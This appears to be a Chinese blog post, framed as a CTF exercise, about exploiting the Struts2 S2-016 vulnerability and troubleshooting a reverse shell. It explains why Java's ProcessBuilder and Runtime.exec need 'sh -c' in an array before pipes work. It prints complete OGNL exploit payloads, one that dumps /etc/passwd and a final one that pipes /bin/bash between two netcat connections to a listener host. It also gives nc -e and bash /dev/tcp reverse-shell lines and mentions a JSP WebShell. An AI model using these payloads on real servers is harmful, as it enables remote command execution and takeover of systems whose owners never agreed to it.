---
title: 记一次漏洞利用反弹Shell出现的问题及原因
date: 2018-06-11 19:53:25
categories: Web
tags:
description:
---

开始是做一道题目，后来发现是S2-016漏洞。于是在网上找了Poc去使用，在使用的时候想直接反弹shell，发现无法去执行对应的命令。于是好奇心的驱使开始探究。


<!-- more -->
<br>
# 问题描述
在执行下面Poc时，会返回一个页面供下载。
如果执行正常，页面中会带有回显值。
如果代码非正常执行或者执行失败，页面内容为空。

根据这样的现象，去执行了对应的代码
```
// POC关键代码
new java.lang.ProcessBuilder(new java.lang.String[]{'nc','10.128.2.186','7777'})).start() // 监听端口已连接上
new java.lang.ProcessBuilder(new java.lang.String[]{'nc','-e','/bin/bash','10.128.2.186','7777'})).start() // 返回空页面
```

发现无法利用`nc -e`参数，所以采用了别的方法继续反弹shell。
```
new java.lang.ProcessBuilder(new java.lang.String[]{'nc','10.128.2.186','7777','|/bin/bash|','nc','10.128.2.186','7778'})).start()
```

发现7777端口能监听到，但是之后的7778没有反应。在不断的测验下，发现当使用链接操作符(`| && `)或者输入输出重定向符号(`>> >`)等等便会出现问题。

**正常执行**
![normal](normal.png)


**使用管道符后**
![notnormal](notnormal.png)


那么为什么带上这些特殊符号就会出问题呢？原因就在**Java执行系统命令的函数上**

<br>
# 原因分析
## Java执行系统命令时连接操作符等等无法使用

`java.lang.ProcessBuilder`与`Runtime.getRuntime().exec()`都可以执行系统命令。
找到的Poc也是调用了`java.lang.ProcessBuilder`去执行系统命令的。

```
// Poc
${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'cat','/etc/passwd'})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()}
```

寻找了它们的资料，得到

>本质上来讲，Runtime.exec()的command参数只是一个可运行的命令或者脚本，并不等效于Shell解器或者Cmd.exe,如果你想进行输入输出重定向，pipeline等操作，则必须通过程序来实现。不能直接在command参数中做。(ProcessBuilder类似)

也就是说不能把利用这些函数运行命令看的那么智能。所以便有一个解决办法，就是利用`sh -c`或`/bin/bash -c`等命令去运行后面的命令。(`-c`参数是利用`bash 或 sh`来执行后面所跟着的命令)

例如执行命令`sh -c id && pwd`就等同于利用java命令函数先去执行`sh -c`,又利用`sh`来运行`id && pwd`。
便解决了问题。

最后Poc可以写成
```
?redirect:${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'sh','-c','nc 10.128.2.186 7777 |/bin/bash|nc 10.128.2.186 7778'})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()}

```
反弹shell成功!!!

<br>
## 为什么要按照数组去传递命令参数
[在 Runtime.getRuntime().exec(String cmd) 中執行任意shell命令的幾種方法](https://hk.saowen.com/a/ec168de38b5cd5ada1912a0ed7fbd4e883daccc84cfe54aa47123fc40c9da117)文章又深入引出了另一个问题。

起初这个问题是在我测试中上传了WebShell，利用WebShell的命令执行同样也无法执行这些命令，便猜测是否是执行命令函数的问题。
同时在上面我们明明可以直接用`sh -c`来运行命令，为什么还要以数组的形式来传递命令运行，直接传入字符串运行不就好了吗？
```
// 数组形式
new java.lang.String[]{'sh','-c','nc 10.128.2.186 7777 |/bin/bash|nc 10.128.2.186 7778'}
// 字符形式
'sh -c nc 10.128.2.186 7777 |/bin/bash|nc 10.128.2.186 7778'
```

原因是当只传入一个字符串时，`Runtime.getRuntime().exec()`函数会根据分隔符(`空格、\t、\n、\r、\f`)来自动分割。那么便有可能导致字符串参数被错误分割，导致shell命令执行失败。
例如传入`sh -c id && pwd`，最后会被分割为`sh` `-c` `id` `&&` `pwd`。实际运行后，会发现只有id被执行了。
而我们直接传入数组，则会按数组顺序来，最后分割为`sh` `-c` `id && pwd`。会把`id && pwd`当作一个完整的参数，便可以正常执行。



<br>
这边需要注意，利用以上方法执行系统命令也会存在问题。例如执行`bash -i >& /dev/tcp/10.128.2.186/9999 0>&1`。


<br>
# 总结
Java中某些Poc执行系统函数时，传入的参数中带有特殊符号无法执行，先观察执行系统命令的函数是什么，如果是利用`ProcessBuilder`，或者`Runtime.getRuntime().exec()`，那么可以传入一个数组，利用`bash -c`或`sh -c`，来执行后面的命令。
```
// Runtime.getRuntime().exec()
Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", command});

// ProcessBuilder
new java.lang.ProcessBuilder(new java.lang.String[]{'sh', '-c', command})).start()
```

某些`jsp`的WebShell执行系统命令无法带有管道符等，说明是WebShell中执行系统命令的函数写法可能存在问题。
```
// 正确写法
Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", command});
```





<br>
# 参照
[在 Runtime.getRuntime().exec(String cmd) 中執行任意shell命令的幾種方法](https://hk.saowen.com/a/ec168de38b5cd5ada1912a0ed7fbd4e883daccc84cfe54aa47123fc40c9da117)
[java Runtime.exec()执行shell/cmd命令：常见的几种陷阱与一种完善实现](https://www.jianshu.com/p/af4b3264bc5d)
